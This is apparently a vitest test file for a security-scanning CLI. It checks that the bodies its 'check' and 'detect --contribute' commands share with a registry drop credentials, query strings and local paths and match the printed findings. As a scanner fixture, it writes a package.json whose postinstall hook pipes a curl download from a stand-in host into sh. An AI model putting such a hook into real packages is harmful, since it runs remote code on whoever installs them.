/**
 * What `check` shares, what it sends again from its retry queue, and the
 * event `detect --contribute` queues, are what the run found.
 *
 * `check` shares a scan when contribution is on and stdin is a terminal; a
 * share the registry refuses is queued in `hma-pending-scans.json` and sent
 * again on the next run. Cells: the target name carries no user name, query
 * string or fragment (the name is URL-shaped without a scheme); no string
 * holds a local path of this run or the working directory's tree hash; the
 * failed findings are the ones the report printed, each with its printed
 * severity; the scan time is the scan's own, so no later than the report's
 * findings line; the retry sends exactly what the first attempt queued.
 *
 * `detect` has no registry URL option: its contribution goes to the default
 * registry, which no test may reach. The run's event is read from the
 * contribution queue it was added to, which is what the next flush sends.
 * Cells: the event carries the run's scan time, its findings counted by the
 * severity the run printed, the verdict those severities make, the score the
 * run printed and the time the scan took.
 *
 * Each body is also compared, byte for byte after normalizing run-to-run
 * values, with the body the unchanged source sent
 * (__tests__/fixtures/outbound-bodies/check-detect.json).
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { assertDistFresh } from '../helpers/dist-freshness';
import { tempDir } from '../helpers/temp-dir';
import {
  bodies,
  differencesFromRecording,
  localPathsIn,
  ms,
  nameProblems,
  normalizeBody,
  printedAt,
  rawBodies,
  runCli,
  seedContributionQueue,
  SEED_EVENT,
  startCaptureRegistry,
  stringsEqualTo,
  treeHashOf,
  urlsWithCredentialsOrQuery,
  type CaptureRegistry,
  type CliRun,
} from '../helpers/outbound-capture';

beforeAll(assertDistFresh);

const RECORDING = path.join(__dirname, '..', 'fixtures', 'outbound-bodies', 'check-detect.json');
const PUBLISH_ROUTE = 'POST /api/v1/trust/publish';
/** A clone URL with a token in the userinfo, a ref in the query, an anchor. */
const SHARED_URL = 'https://ci-user:FAKE-clone-token@gitlab.com/example-org/outbound-check.git?ref=main#readme';
const SHARED_NAME = 'gitlab.com/example-org/outbound-check';
const OTHER_URL = 'https://gitlab.com/example-org/outbound-other.git';
const OTHER_NAME = 'gitlab.com/example-org/outbound-other';

const GIT_SHIM = `#!/bin/sh
# Stands in for git: \`git clone ... <url> <dest>\` copies the fixture tree to
# <dest>. Any other git command fails.
if [ "$1" = "clone" ]; then
  for dest in "$@"; do last="$dest"; done
  mkdir -p "$last" && cp -R "$HMA_TEST_CLONE_SOURCE/." "$last/"
  exit $?
fi
exit 1
`;

let scratch = '';
let registry: CaptureRegistry;
let source = '';
let binDir = '';
let failedShareRun: CliRun;
let retryRun: CliRun;
let failedQueue: Array<Record<string, any>> = [];
let retryQueue: unknown;
let detectRun: CliRun;
let detectEvent: Record<string, any>;
let detectPrinted: Record<string, any>;

function check(label: string, url: string, publishStatus: number, queue?: unknown[]): CliRun {
  registry.setPublishStatus(publishStatus);
  return runCli(['check', url], {
    runDir: path.join(scratch, label), registry, tty: true, pathPrefix: [binDir],
    env: { HMA_TEST_CLONE_SOURCE: source },
    before: ({ opena2aHome }) => {
      fs.writeFileSync(path.join(opena2aHome, 'config.json'), JSON.stringify({ contribute: { enabled: true } }) + '\n');
      if (queue) fs.writeFileSync(path.join(opena2aHome, 'hma-pending-scans.json'), JSON.stringify(queue, null, 2));
    },
  });
}

const queueOf = (run: CliRun): unknown => {
  const p = path.join(run.opena2aHome, 'hma-pending-scans.json');
  return fs.existsSync(p) ? JSON.parse(fs.readFileSync(p, 'utf8')) : null;
};

/** The failed findings a `check` report printed (`│ CRITICAL  Dangerous npm Scripts`), as sorted [severity, name]. */
function printedFindings(run: CliRun): string[] {
  return [...run.stdout.matchAll(/^\s*│ (CRITICAL|HIGH|MEDIUM|LOW) {2}(.+)$/gm)].map((m) => `${m[1].toLowerCase()} ${m[2].trim()}`).sort();
}

/** The failed findings a share sent, as sorted [severity, name]: the report orders by severity, the share by scan. */
function failedSent(share: Record<string, any>): string[] {
  return share.findings.filter((f: { passed: boolean }) => !f.passed).map((f: { severity: string; name: string }) => `${f.severity} ${f.name}`).sort();
}

beforeAll(async () => {
  scratch = tempDir('hma-outbound-check-');
  registry = await startCaptureRegistry(scratch);
  source = path.join(scratch, 'source');
  binDir = path.join(scratch, 'bin');
  fs.mkdirSync(source, { recursive: true });
  fs.mkdirSync(binDir, { recursive: true });
  fs.writeFileSync(path.join(binDir, 'git'), GIT_SHIM, { mode: 0o755 });
  fs.writeFileSync(path.join(source, 'package.json'), JSON.stringify({
    name: 'outbound-check',
    version: '2.0.0',
    scripts: { postinstall: 'curl -s http://example.invalid/setup.sh | sh' },
  }, null, 2) + '\n');
  fs.writeFileSync(path.join(source, 'SOUL.md'), '# Agent\n\nYou are a helpful assistant. You can read files and call tools.\n');

  failedShareRun = check('failed-share', SHARED_URL, 503);
  failedQueue = (queueOf(failedShareRun) as Array<Record<string, any>> | null) ?? [];
  retryRun = check('retry', OTHER_URL, 200, failedQueue);
  retryQueue = queueOf(retryRun);

  detectRun = runCli(['detect', source, '--contribute', '--json'], {
    runDir: path.join(scratch, 'detect'), registry, before: seedContributionQueue,
  });
  detectPrinted = JSON.parse(detectRun.stdout);
  const queued = JSON.parse(fs.readFileSync(path.join(detectRun.home, '.opena2a', 'contribute-queue.json'), 'utf8')).events as Array<Record<string, any>>;
  expect(queued.slice(0, 9)).toEqual(Array.from({ length: 9 }, () => SEED_EVENT));
  expect(queued.length).toBe(10);
  detectEvent = queued[9];
}, 600_000);

afterAll(() => registry?.stop());

describe('every body check sends', () => {
  it.each([['the failed share', () => failedShareRun], ['the retry', () => retryRun]])(
    '%s: no URL with a user name, password, query or fragment; no local path; no working-directory tree hash',
    (_label, run) => {
      const sent = bodies(run(), PUBLISH_ROUTE);
      expect(sent.length).toBeGreaterThan(0);
      const roots = [scratch, source, run().cwd, run().home, os.homedir()];
      const cwdHash = treeHashOf(run().cwd);
      expect(sent.flatMap((b) => [
        ...urlsWithCredentialsOrQuery(b),
        ...localPathsIn(b, roots),
        ...stringsEqualTo(b, cwdHash),
        ...nameProblems(b.name),
      ])).toEqual([]);
    },
  );
});

describe('check shares the scan it reported', () => {
  it('names the target without the user name, query string and fragment of the URL it was given', () => {
    expect(bodies(failedShareRun, PUBLISH_ROUTE).map((b) => b.name)).toEqual([SHARED_NAME]);
  });

  it('sends the failed findings the report printed, each with its printed severity', () => {
    const [share] = bodies(failedShareRun, PUBLISH_ROUTE);
    expect(failedSent(share).length).toBeGreaterThan(0);
    expect(failedSent(share)).toEqual(printedFindings(failedShareRun));
  });

  it('stamps the share with the time of the scan, before the report printed its findings', () => {
    const at = ms(bodies(failedShareRun, PUBLISH_ROUTE)[0].scanTimestamp);
    expect(at).toBeGreaterThanOrEqual(failedShareRun.startedAt);
    expect(at).toBeLessThanOrEqual(printedAt(failedShareRun, '── Findings'));
  });

  it('queues the share it could not send, as it sent it', () => {
    const [share] = bodies(failedShareRun, PUBLISH_ROUTE);
    expect(failedQueue).toHaveLength(1);
    const { tool: _tool, ...submission } = share;
    expect(failedQueue[0]).toEqual(submission);
  });
});

describe('check sends a queued share again as it was queued', () => {
  it('the retry sends the queued share first, unchanged, then the run\'s own', () => {
    const sent = bodies(retryRun, PUBLISH_ROUTE);
    expect(sent.map((b) => b.name)).toEqual([SHARED_NAME, OTHER_NAME]);
    expect(sent[0]).toEqual(bodies(failedShareRun, PUBLISH_ROUTE)[0]);
    expect(retryQueue).toEqual([]);
  });

  it('the run\'s own share carries the failed findings its report printed', () => {
    expect(failedSent(bodies(retryRun, PUBLISH_ROUTE)[1])).toEqual(printedFindings(retryRun));
  });
});

describe('detect --contribute', () => {
  const counts = () => {
    const c = { critical: 0, high: 0, medium: 0, low: 0 } as Record<string, number>;
    for (const f of detectPrinted.findings as Array<{ severity: string }>) c[f.severity] += 1;
    return c;
  };

  it('the run printed findings', () => {
    expect((detectPrinted.findings as unknown[]).length).toBeGreaterThan(0);
  });

  it('counts the findings the run printed by their severity, and the verdict they make', () => {
    const s = detectEvent.scanSummary;
    const c = counts();
    expect([s.critical, s.high, s.medium, s.low]).toEqual([c.critical, c.high, c.medium, c.low]);
    expect(s.verdict).toBe(c.critical > 0 ? 'fail' : c.high > 0 ? 'warn' : 'pass');
  });

  it('carries the score the run printed and no count of checks it does not have', () => {
    const s = detectEvent.scanSummary;
    expect(s.score).toBe(detectPrinted.summary.governanceScore);
    expect(s).not.toHaveProperty('totalChecks');
  });

  it('carries the time of the scan and the time it took', () => {
    expect(detectEvent.timestamp).toBe(detectPrinted.scanTimestamp);
    expect(detectEvent.scanSummary.durationMs).toBeGreaterThan(0);
    expect(detectEvent.scanSummary.durationMs).toBeLessThanOrEqual(detectRun.endedAt - detectRun.startedAt);
  });

  it('names the package the run scanned, and no local path', () => {
    expect(detectEvent.package).toEqual({ name: 'outbound-check', version: '2.0.0', ecosystem: 'npm' });
    expect(localPathsIn(detectEvent, [scratch, source, detectRun.cwd, detectRun.home, os.homedir()])).toEqual([]);
  });
});

describe('what check and detect send, against what the unchanged source sent', () => {
  it('every body is byte-identical once run-to-run values are normalized, apart from the fields this change corrects', () => {
    const n = (raw: string) => normalizeBody(raw, registry);
    const current: Record<string, string> = {
      'check: failed share': n(rawBodies(failedShareRun, PUBLISH_ROUTE)[0]),
      'check: retried share': n(rawBodies(retryRun, PUBLISH_ROUTE)[0]),
      'check: own share after the retry': n(rawBodies(retryRun, PUBLISH_ROUTE)[1]),
      'detect: contribution event': n(JSON.stringify(detectEvent)),
    };
    expect(differencesFromRecording(RECORDING, current, CHANGED)).toEqual([]);
  });
});

/**
 * The fields this change corrects, per site. A share's name kept the
 * remote's query string and fragment (`.git?ref=main#readme`). The detect
 * event sent `totalChecks: 0`, no high finding, `score: 0` and
 * `verdict: 'pass'` for a run that printed a high finding and 3/100.
 */
const CHANGED: Record<string, readonly string[]> = {
  'check: failed share': ['name'],
  'check: retried share': ['name'],
  'detect: contribution event': [
    'scanSummary.totalChecks',
    'scanSummary.high',
    'scanSummary.score',
    'scanSummary.verdict',
  ],
};
